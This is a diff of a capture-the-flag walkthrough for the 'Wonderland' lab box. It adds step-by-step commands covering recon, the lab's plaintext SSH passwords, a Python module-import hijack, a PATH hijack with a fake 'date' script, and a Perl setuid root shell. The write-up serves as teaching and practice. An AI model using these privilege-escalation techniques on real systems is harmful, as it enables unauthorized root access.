@@ -38,21 +38,138 @@ It’s great for practicing *thinking like the system* — where scripts trust l
 ---
 
 ## Recon & discovery
+Started with **nmap**:
 
-I started with a basic port scan and directory fuzzing.
+nmap -Pn -sC -sV <TARGET-IP>
 
-- **Nmap** showed `22/tcp` (OpenSSH) and `80/tcp` (Go net/http server).  
-- **Gobuster** discovered `/img`, `/r`, and `/poem`.  
-- Inside `/img` I found images and used **StegSeek** — one image revealed a `hint.txt` with the phrase `follow the r a b b i t`, which pointed me to `/r/a/b/b/i/t`.
+Output:
 
-That steg hint and the folder structure nudged me to check the site source more closely — there I found a string that looked like credentials for `alice`.
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
+80/tcp open  http    Golang net/http server
+HTTP title: Follow the white rabbit.
 
----
+Directory fuzzing with gobuster:
 
-## Initial access — `alice`
+gobuster dir -u http://<TARGET-IP> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100
 
-I used the discovered credentials to SSH in:
+Found directories:
 
-```text
+/img
+/r
+/poem
+
+Inside /img:
+
+    alice_door.jpg
+
+    alice_door.png
+
+    white_rabbit_1.jpg
+
+Used StegSeek to extract hidden data:
+
+stegseek white_rabbit_1.jpg
+cat white_rabbit_1.jpg.out
+# => follow the r a b b i t
+
+The hint pointed towards /r/a/b/b/i/t. Gobuster confirmed the path. The web page source revealed what looked like SSH credentials:
+
+alice:HowDothTheLittleCrocodileImproveHisShiningTail
+
+Initial access — alice
+
+SSH in:
+
 ssh alice@<TARGET-IP>
 # password: HowDothTheLittleCrocodileImproveHisShiningTail
+
+Check sudo privileges:
+
+sudo -l
+
+Output:
+
+User alice may run the following commands on wonderland:
+    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+
+From alice → rabbit (sudo import hijack)
+
+The Python script /home/alice/walrus_and_the_carpenter.py imported a module without a full path. This allowed creating our own module for privilege escalation.
+
+# random.py
+import os
+os.system("/bin/bash")
+
+Run as rabbit:
+
+sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+
+Now we have a shell as rabbit.
+From rabbit → hatter (PATH hijack)
+
+teaParty.py executed date without specifying the full path. Steps to escalate:
+
+# create fake date binary
+cat > date <<'EOF'
+#!/bin/bash
+/bin/bash
+EOF
+
+chmod +x date
+export PATH=/home/rabbit:$PATH
+
+Run the script — shell now runs as hatter. Found password:
+
+hatter:WhyIsARavenLikeAWritingDesk?
+
+Root escalation
+
+After logging in as hatter with a clean session, I ran linpeas/LinEnum. Capabilities indicated Perl could escalate privileges.
+
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+# whoami
+root
+
+Flags captured:
+
+    user.txt
+
+    root.txt ✅
+
+Commands (collapsed)
+<details> <summary>Click to expand main commands</summary>
+
+# nmap
+nmap -Pn -sC -sV <TARGET-IP>
+
+# gobuster
+gobuster dir -u http://<TARGET-IP> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100
+
+# steg
+stegseek white_rabbit_1.jpg
+cat white_rabbit_1.jpg.out
+
+# SSH initial
+ssh alice@<TARGET-IP>
+
+# sudo check
+sudo -l
+
+# random.py exploit
+cat > random.py <<'PY'
+import os
+os.system("/bin/bash")
+PY
+sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+
+# date PATH hijack
+cat > date <<'SH'
+#!/bin/bash
+/bin/bash
+SH
+chmod +x date
+export PATH=/home/rabbit:$PATH
+
+# Perl root escalation
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
